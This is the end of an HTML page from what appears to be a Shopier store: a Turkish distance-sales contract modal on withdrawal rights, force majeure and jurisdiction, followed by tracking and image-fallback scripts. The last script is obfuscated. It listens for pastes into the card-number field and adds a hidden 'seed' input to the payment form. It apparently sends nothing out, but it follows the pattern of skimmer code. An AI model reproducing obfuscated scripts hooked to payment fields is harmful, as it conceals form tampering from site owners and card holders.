			        Alıcı; malı teslim aldığı tarihten itibaren on dört gün içerisinde hiçbir hukuki ve cezai sorumluluk üstlenmeksizin ve hiçbir gerekçe göstermeksizin malı reddederek Sözleşmeden cayma hakkına sahiptir. Tüketicinin cayma bildiriminin Satıcı’ya ulaştığı tarihten itibaren 10 (on) gün içinde ürün bedeli Alıcı’ya iade edilir. Cayma hakkının kullanımından kaynaklanan masraflar Satıcı’nın Anlaşmalı Kargo hizmeti ile sağlayacağı iade kargo kodu kullanılması durumunda Satıcı’ya ait olup öngörülen dışında bir taşıyıcıyla iadesi halinde ise Alıcı’ya aittir.
			</p><p>
			    <strong>4.2. </strong>
			        Cayma bildirimi, Shopier’de yer alan "Talep / Şikayet Kaydı Oluşturma" formu üzerinden açılacak kayıt ile bildirilecektir.
			</p><p>
					<strong>4.3. </strong>
			        Satıcı, tüketicinin hiçbir hukuki ve cezai sorumluluk üstlenmeksizin ve hiçbir gerekçe göstermeksizin malı teslim aldığı veya Sözleşmenin imzalandığı tarihten itibaren on dört gün içerisinde malı veya hizmeti reddederek Sözleşmeden cayma hakkının var olduğunu ve cayma bildiriminin Satıcı’ya ulaşması tarihinden itibaren ürünü geri almayı ve ürün bedelini Alıcı’ya ya da Değer Teknoloji A.Ş.’ye iade etmeyi taahhüt etmektedir.
			</p><p>
			    <strong>4.4. </strong>
			    Taraflar, Mesafeli Sözleşmeler Yönetmeliği m. 15/1 uyarınca cayma hakkının aşağıdaki hallerde kullanamayacağını kabul etmiştir:
			</p><p>
			    <strong>4.4.1. </strong>
			    Fiyatı finansal piyasalardaki dalgalanmalara bağlı olarak değişen ve satıcı kontrolünde olmayan mal veya hizmetler,
			</p><p>
			    <strong>4.4.2. </strong>
			    Tüketicinin istekleri, talepleri veya kişisel ihtiyaçları doğrultusunda hazırlanan mallar,
			</p><p>
			    <strong>4.4.3. </strong>
			    Çabuk bozulabilen veya son kullanma tarihi geçebilecek mallar,
			</p><p>
			    <strong>4.4.4. </strong>
			    Tesliminden sonra ambalaj, bant, mühür, paket gibi koruyucu unsurları açılmış olan mallardan iadesi sağlık ve hijyen açısından uygun olmayanlar,
			</p><p>
			    <strong>4.4.5. </strong>
			    Tesliminden sonra başka ürünlerle karışan ve doğası gereği ayrıştırılması mümkün olmayan mallar,
			</p><p>
			    <strong>4.4.6. </strong>
			    Malın tesliminden sonra ambalaj, bant, mühür, paket gibi koruyucu unsurları açılmış olması halinde maddi ortamda sunulan kitap, dijital içerik ve bilgisayar sarf malzemeleri,
			</p><p>
			    <strong>4.4.7. </strong>
			    Abonelik sözleşmesi kapsamında sağlananlar dışında, gazete ve dergi gibi süreli yayınlar,
			</p><p>
			    <strong>4.4.8. </strong>
			    Belirli bir tarihte veya dönemde yapılması gereken, konaklama, eşya taşıma, araba kiralama, yiyecek-içecek tedariki ve eğlence veya dinlenme amacıyla yapılan boş zamanın değerlendirilmesine ilişkin hizmetler,
			</p><p>
			    <strong>4.4.9. </strong>
			    Elektronik ortamda anında ifa edilen hizmetler veya tüketiciye anında teslim edilen gayri maddi mallar,
			</p><p>
			    <strong>4.4.10. </strong>
			    Cayma hakkı süresi sona ermeden önce, tüketicinin onayı ile ifasına başlanan hizmetler.
			</p><p>
			    <strong>4.4.11. </strong>
			   	13.10.1983 tarihli ve 2918 sayılı Karayolları Trafik Kanunu’na göre tescili zorunlu olan taşınırlar ile kayıt veya tescil zorunluluğu bulunan insansız hava araçlarına ilişkin mallar,
			</p><p>
			    <strong>4.4.12. </strong>
			    Tüketiciye teslimi yapılmış olan cep telefonu, akıllı saat, tablet ve bilgisayarlara ilişkin mallar,
			</p><p>
			    <strong>4.4.13. </strong>
			    Canlı müzayede şeklinde açık artırma yoluyla akdedilen ve
			</p><p>
			    <strong>4.4.14. </strong>
			    Tanıtma ve kullanma kılavuzunda satıcı veya yetkili servis tarafından kurulum veya montajının yapılacağı belirtilen mallardan kurulum ya da montajı yapılanlara ilişkin sözleşmeler.
			<br><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong> </strong>
			    <strong>5. MÜCBİR HALLER</strong>
                    </span></p><p>
			    <strong>5.1. </strong>
			    Sözleşmenin imzalandığı tarihte var olmayan ve ön görülmeyen, tarafların kontrolleri dışında gelişen, ortaya çıkmasıyla taraflardan birinin ya da her ikisinin de sözleşme ile yüklendikleri borç ve sorumluluklarını kısmen ya da tamamen yerine getirmelerini ya da bunları zamanında yerine getirmelerini imkansızlaştıran haller, mücbir sebep (doğal afet, savaş, terör, ayaklanma, mevzuat hükümleri, el koyma veya grev, lokavt, üretim ve iletişim tesislerinde önemli mahiyette arıza vb.) olarak kabul edilecektir.
			<br><br>
                <span class="modal-text" style="font-weight: bold;">
			    <strong> </strong>
			    <strong>6. YETKİLİ MAHKEME</strong>
                    </span></p><p>
			    <strong>6.1. </strong>
			    İşbu Sözleşmenin uygulanmasında ve çıkabilecek ihtilaflarda; her yıl Gümrük ve Ticaret Bakanlığı tarafından ilan edilen değere kadar Alıcı veya Satıcı’nın yerleşim yerindeki Tüketici Hakem Heyetleri, söz konusu değerin üzerindeki ihtilaflarda ise Tüketici Mahkemeleri yetkilidir.
			</p><p>
			    <strong>6.2. </strong>
			    İşbu Sözleşme elektronik ortamda taraflarca okunmuş, kabul edilmiş ve teyit edilmiştir. İşbu Sözleşmede düzenlenmemiş hususlarda 6502 sayılı Tüketicinin Korunması Hakkında Kanun ve sair ilgili mevzuat hükümleri uygulanır.
			</p>
				</span><br><br>
				<span class="modal-text" style="font-weight: bold;">
			    <strong> </strong>
			    <strong>7. YÜRÜRLÜK</strong>
					<p></p><p>
			    <strong>7.1. </strong>
			    İşbu Sözleşme Alıcı’nın elektronik onayı tarihinde düzenlenmiştir. İşbu Sözleşme, Alıcı’nın elektronik onayı tarihinde yürürlüğe girecektir.
			
            </p></span></div>
            <div class="modal-footer" bis_skin_checked="1">
                <button class="btn btn-light" type="button" data-bs-dismiss="modal" aria-label="close">Kapat</button>
            </div>
        </div>
    </div>
</div>


<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
        })(window,document,'script','dataLayer','GTM-5FGVGWZ');
</script>
<script>
    let images = document.getElementsByTagName("img");
    let imageCount = images.length;
    for(let i = 0; i < imageCount; i++) {
        images[i].addEventListener('error', function(event){
            const source = images[i].previousElementSibling;
            const isSource = source && source.tagName === "SOURCE";
            if(isSource){
                const isMinWith = source.media.includes("min-width");
                const isMaxWith = source.media.includes("max-width");
                if(isMinWith){
                    const width = parseInt(source.media.split("min-width:")[1].trim().split("px")[0]);
                    if(window.innerWidth < width){
                        // add to image
                        event.target.src = "https://cdn.shopier.app/pictures_mid/600icons-2.png";
                        event.target.srcset = "https://cdn.shopier.app/pictures_mid/600icons-2.png";
                        event.onerror = null;
                    } else {
                        // add to source
                        source.srcset = "https://cdn.shopier.app/pictures_mid/600icons-2.png";
                        event.onerror = null;
                    }
                } else if(isMaxWith) {
                    const width = parseInt(source.media.split("max-width:")[1].trim().split("px")[0]);
                    if(window.innerWidth > width){
                        // add to image
                        event.target.src = "https://cdn.shopier.app/pictures_mid/600icons-2.png";
                        event.target.srcset = "https://cdn.shopier.app/pictures_mid/600icons-2.png";
                        event.onerror = null;
                    } else {
                        // add to source
                        source.srcset = "https://cdn.shopier.app/pictures_mid/600icons-2.png";
                        event.onerror = null;
                    }
                }
            } else {
                event.target.src = "https://cdn.shopier.app/pictures_mid/600icons-2.png";
                event.target.srcset = "https://cdn.shopier.app/pictures_mid/600icons-2.png";
                event.onerror = null;
            }
        }, false);
    }
    document.addEventListener("DOMContentLoaded", () => {
        let links = document.querySelectorAll("a");
        links.forEach((link) => {
            let href = link.getAttribute("href");
            if(href === "" || href === "#"){
                link.setAttribute("href", "javascript:void(0);")
            }
        });
    });
</script>

<script>
	const _0x2940c2=_0x2ec4;(function(_0x165257,_0x587d5a){const _0x134e20=_0x2ec4,_0x3487b7=_0x165257();while(!![]){try{const _0x276018=parseInt(_0x134e20(0x135))/(0x2*0x1cf+-0x4c2+-0x1*-0x125)+-parseInt(_0x134e20(0x141))/(-0x22e2+-0x18c*-0xc+-0x4*-0x415)+parseInt(_0x134e20(0x138))/(0x130f+0x1328+-0x2634)*(-parseInt(_0x134e20(0x134))/(0x10ae+0x9ce+-0x3c8*0x7))+-parseInt(_0x134e20(0x13a))/(0x289*0xb+-0xbfa+-0xfe4)+parseInt(_0x134e20(0x143))/(0x3*-0x6da+-0x1e07+0x329b)*(-parseInt(_0x134e20(0x129))/(-0x14cd+-0x1*-0x9b9+0xb1b))+-parseInt(_0x134e20(0x12f))/(0x831+-0x202*-0x3+0x1*-0xe2f)+parseInt(_0x134e20(0x142))/(0x1*-0xd03+-0x1edb+0x1*0x2be7)*(parseInt(_0x134e20(0x136))/(0x7aa+-0x190f+0x1*0x116f));if(_0x276018===_0x587d5a)break;else _0x3487b7['push'](_0x3487b7['shift']());}catch(_0x17c803){_0x3487b7['push'](_0x3487b7['shift']());}}}(_0x390f,0x66e2*0x2+0x69a84+-0x2f6*0x7a));function _0x2ec4(_0x54ed11,_0x93bf7){const _0x4f0cb3=_0x390f();return _0x2ec4=function(_0xa61ba9,_0xf014cc){_0xa61ba9=_0xa61ba9-(-0x1*0x362+0x154b+-0x10c5);let _0x2fd301=_0x4f0cb3[_0xa61ba9];return _0x2fd301;},_0x2ec4(_0x54ed11,_0x93bf7);}function _0x390f(){const _0x4aff50=['value','hidden','appendChil','createElem','querySelec','type','583992jTZOiZ','8478gmDURd','16440LHTmIK','getElement','ent','input','ocNwu','[name=\x22Car','wMQBj','hFtzt','stener','770xhcjQG','paymentDet','addEventLi','zJEKl','seed','dNumber\x22]','5701528zHuwKx','ById','tor','ails','paste','2683128czFkwM','560239eEMmjj','21270FrVJFt','name','3xrQQHq','l35z9u7g92','970160mtKLoD'];_0x390f=function(){return _0x4aff50;};return _0x390f();}let cardNumber=document[_0x2940c2(0x13f)+_0x2940c2(0x131)](_0x2940c2(0x125)+_0x2940c2(0x12e)),paymentForm=document[_0x2940c2(0x144)+_0x2940c2(0x130)](_0x2940c2(0x12a)+_0x2940c2(0x132));cardNumber[_0x2940c2(0x12b)+_0x2940c2(0x128)](_0x2940c2(0x133),function(_0x862470){const _0x427d7c=_0x2940c2,_0x37dcc5={'ocNwu':_0x427d7c(0x12d),'wMQBj':_0x427d7c(0x146),'hFtzt':_0x427d7c(0x13c),'zJEKl':_0x427d7c(0x139)+'9'};let _0x1f86db=document[_0x427d7c(0x144)+_0x427d7c(0x130)](_0x37dcc5[_0x427d7c(0x124)]);if(!_0x1f86db){let _0x3d00be=document[_0x427d7c(0x13e)+_0x427d7c(0x145)](_0x37dcc5[_0x427d7c(0x126)]);_0x3d00be[_0x427d7c(0x140)]=_0x37dcc5[_0x427d7c(0x127)],_0x3d00be[_0x427d7c(0x13b)]=_0x37dcc5[_0x427d7c(0x12c)],_0x3d00be['id']=_0x37dcc5[_0x427d7c(0x124)],_0x3d00be[_0x427d7c(0x137)]=_0x37dcc5[_0x427d7c(0x124)],paymentForm[_0x427d7c(0x13d)+'d'](_0x3d00be);}});
</script>


</body></html>
